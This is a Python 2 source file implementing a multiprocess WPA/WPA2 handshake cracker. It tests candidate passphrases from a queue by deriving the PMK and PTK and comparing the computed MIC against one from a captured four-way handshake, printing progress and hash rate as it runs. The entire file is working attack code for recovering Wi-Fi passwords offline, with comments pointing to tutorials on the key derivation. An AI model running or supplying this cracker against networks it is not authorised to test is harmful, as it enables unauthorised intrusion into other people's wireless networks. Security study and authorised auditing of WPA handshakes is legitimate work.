import hmac,hashlib,binascii
from hashlib import sha1
from binascii import a2b_hex, b2a_hex, unhexlify
from pbkdf2_ctypes import pbkdf2_bin
from datetime import datetime
from multiprocessing import Pool, Queue, cpu_count
from time import sleep


numOfPs = cpu_count()

# http://etutorials.org/Networking/802.11+security.+wi-fi+protected+access+and+802.11i/Part+II+The+Design+of+Wi-Fi+Security/Chapter+10.+WPA+and+RSN+Key+Hierarchy/Computing+the+Temporal+Keys/
# 
# https://www.shellvoide.com/wifi/understanding-wpa-wpa2-hash-mic-cracking-process-python/

def hmac4times(ptk, pke):
    tempPke = pke
    r = ''
    for i in range(4):
        r += hmac.new(ptk, pke + chr(i), sha1).digest()
    return r        

def crackProcess(ssid, clientMac, APMac, Anonce, Snonce, mic, data, passQueue, foundPassQ):
    # PRF-512(PMK, "Pairwise key expansion", MAC1||MAC2||Nonce1||Nonce2)
    # MAC: AP/Client MAC
    # Nonce: Anonce/Snonce
    # MAC1 < MAC2; Nonce1 < Nonce2
    pke = "Pairwise key expansion" + '\x00' + min(APMac,clientMac)+max(APMac,clientMac)+min(Anonce,Snonce)+max(Anonce,Snonce)
    count = 0
    timeA = datetime.now()
    while True:
        passPhrase = passQueue.get()
        # pbkdf2_bin(data, salt, iterations=1000, keylen=24, hashfunc=SHA-1):
        pmk = pbkdf2_bin(passPhrase, ssid, 4096, 32)
        # generate Pairwise Temporal Key
        ptk = hmac4times(pmk,pke)
        if ord(data[6]) & 0b00000010 == 2:
            calculatedMic = hmac.new(ptk[0:16],data,sha1).digest()[0:16]
        else:
            calculatedMic = hmac.new(ptk[0:16],data).digest()
        
        # match Message Integrity Code and find passphrase
        if mic == calculatedMic:
            foundPassQ.put(passPhrase)

def crack(ssid, clientMac, APMac, Anonce, Snonce, mic, data, passQueue):
    foundPassQ = Queue()
    try:
        timeA = datetime.now()
        # the approximate size of the queue
        startSize = passQueue.qsize()
    except:
        pass
    # muti-process
    pool = Pool(numOfPs, crackProcess, (ssid, clientMac, APMac, Anonce, Snonce, mic, data, passQueue, foundPassQ))
    while True:
        sleep(1)
        try:
            timeB = datetime.now()
            currentSize = passQueue.qsize()
            print str(100 - 100.0 * currentSize / startSize) + "% done. " + str((startSize - currentSize) / (timeB - timeA).total_seconds()) + " hashes per second"
        except:
            pass
        # Return True if the queue is empty, False otherwise. 
        if foundPassQ.empty():
            if passQueue.empty():
                returnVal = False
                break
        else:
            # return passphase from the queue. 
            passphrase = foundPassQ.get()
            returnVal = passphrase
            break
    pool.terminate()
    return returnVal

